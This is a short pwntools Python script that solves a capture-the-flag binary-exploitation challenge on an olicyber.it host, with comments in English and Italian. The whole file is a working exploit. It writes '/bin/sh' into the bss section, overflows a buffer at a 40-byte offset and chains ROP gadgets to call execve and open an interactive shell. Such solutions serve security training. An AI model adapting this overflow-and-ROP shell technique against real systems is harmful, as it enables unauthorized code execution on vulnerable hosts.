from pwn import *

HOST = "emergency.challs.olicyber.it"
PORT = 10306

s = remote(HOST, PORT)

s.recvuntil(b">")
s.send(b"/bin/sh\x00") # the program write directly in the bss section, so we can write the string "/bin/sh" directly

# Gadget ROP
offset = 40                  
pop_rdi = 0x401032
pop_rsi = 0x401034
pop_rdx = 0x401036
xor_rax_rdi = 0x401038
syscall = 0x40101a
bss_addr = 0x404000 

payload = b"A" * offset

# RAX = 0, 0 ^ 59 = 59 (execve)
payload += p64(pop_rdi)
payload += p64(59)           # Carichiamo 59 in RDI
payload += p64(xor_rax_rdi)  # Eseguiamo lo XOR -> RAX diventa 59

# Config for execve("/bin/sh", 0, 0)
payload += p64(pop_rdi)
payload += p64(bss_addr)     # RDI = puntatore a "/bin/sh"
payload += p64(pop_rsi)
payload += p64(0)            # RSI = 0
payload += p64(pop_rdx)
payload += p64(0)            # RDX = 0

# Execute the syscall
payload += p64(syscall)     

s.recvuntil(b">")
s.send(payload)              

s.interactive()
